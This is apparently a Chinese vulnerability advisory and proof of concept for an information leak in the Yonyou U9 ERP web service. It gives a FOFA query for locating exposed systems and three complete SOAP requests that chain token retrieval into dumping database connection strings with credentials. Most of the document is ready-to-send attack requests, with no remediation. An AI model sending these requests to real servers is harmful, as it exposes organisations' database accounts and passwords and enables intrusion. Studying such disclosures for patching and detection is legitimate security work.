## 用友u9系统接口GetConnectionString存在信息泄露漏洞

用友u9 GetConnectionString存在信息泄露漏洞，攻击者可通过该漏洞获取数据库连接信息包括数据库账号密码等敏感信息。

## fofa

```
body="logo-u9.png"
```

## poc

1. 获取code

```
POST /CS/Office/TransWebService.asmx HTTP/1.1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:126.0) Gecko/20100101 Firefox/126.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Connection: close
Cookie: .ASPXANONYMOUS=1trTf5ff2gEkAAAAMzU0N2I3ZjctYzg0OC00YWFmLTliZTEtNDI2NDc1YmYyMTc10; ASP.NET_SessionId=ntvjalpizrae22kebxy5tn0g
Upgrade-Insecure-Requests: 1
Priority: u=1
SOAPAction: http://tempuri.org/GetEnterprise
Content-Type: text/xml;charset=UTF-8
Host: 
Content-Length: 193

<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope" xmlns:tem="http://tempuri.org/">
   <soap:Header/>
   <soap:Body>
      <tem:GetEnterprise/>
   </soap:Body>
</soap:Envelope>
```

![image.png](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202407022234900.png)

2. 使用上一步获取的code获取token

```
POST /CS/Office/TransWebService.asmx HTTP/1.1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:126.0) Gecko/20100101 Firefox/126.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Connection: close
Cookie: .ASPXANONYMOUS=1trTf5ff2gEkAAAAMzU0N2I3ZjctYzg0OC00YWFmLTliZTEtNDI2NDc1YmYyMTc10; ASP.NET_SessionId=ntvjalpizrae22kebxy5tn0g
Upgrade-Insecure-Requests: 1
Priority: u=1
SOAPAction: http://tempuri.org/GetToken
Content-Type: text/xml;charset=UTF-8
Host: 
Content-Length: 274

<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope" xmlns:tem="http://tempuri.org/">
   <soap:Header/>
   <soap:Body>
      <tem:GetToken>
         <!--type: string-->
         <tem:endId>800</tem:endId>
      </tem:GetToken>
   </soap:Body>
</soap:Envelope>
```

![image.png](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202407022234913.png)

3. 使用token获取数据库连接信息

```
POST /CS/Office/TransWebService.asmx HTTP/1.1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:126.0) Gecko/20100101 Firefox/126.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Connection: close
Cookie: .ASPXANONYMOUS=1trTf5ff2gEkAAAAMzU0N2I3ZjctYzg0OC00YWFmLTliZTEtNDI2NDc1YmYyMTc10; ASP.NET_SessionId=ntvjalpizrae22kebxy5tn0g
Upgrade-Insecure-Requests: 1
Priority: u=1
SOAPAction: http://tempuri.org/GetConnectionString
Content-Type: text/xml;charset=UTF-8
Host: 
Content-Length: 325

<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope" xmlns:tem="http://tempuri.org/">
   <soap:Header/>
   <soap:Body>
      <tem:GetConnectionString>
         <!--type: string-->
         <tem:token>Kp6iL9otgGlgsewf7WNyyT+BCVbWriP4</tem:token>
      </tem:GetConnectionString>
   </soap:Body>
</soap:Envelope>
```

![image.png](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202407022234944.png)